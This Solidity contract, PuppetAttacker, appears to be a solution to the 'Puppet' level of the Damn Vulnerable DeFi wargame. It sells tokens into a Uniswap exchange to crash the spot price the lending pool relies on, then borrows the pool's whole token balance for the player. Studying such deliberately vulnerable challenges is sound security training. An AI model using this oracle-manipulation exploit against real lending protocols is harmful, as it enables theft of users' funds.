// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";

contract PuppetAttacker {
    DamnValuableToken tokenAddress;
    IUniswapExchange uniswapPairAddress;
    address player;
    PuppetPool pool;

    constructor(address _tokenAddress, IUniswapExchange _uniswapPairAddress, address _player, PuppetPool _pool) payable {
        tokenAddress = DamnValuableToken(_tokenAddress);
        uniswapPairAddress = _uniswapPairAddress;
        player = _player;
        pool = _pool;
    }

    function triggerAttack(uint256 tokens_sold, uint256 min_eth, uint256 timestamp) external {
        tokenAddress.approve(address(uniswapPairAddress), tokens_sold);
        uniswapPairAddress.tokenToEthSwapInput(tokens_sold, min_eth, timestamp);
        uint256 neededAmount = pool.calculateDepositRequired(tokenAddress.balanceOf(address(pool)));
        pool.borrow{value: neededAmount}(tokenAddress.balanceOf(address(pool)), address(player));
    }

    receive() external payable { }
}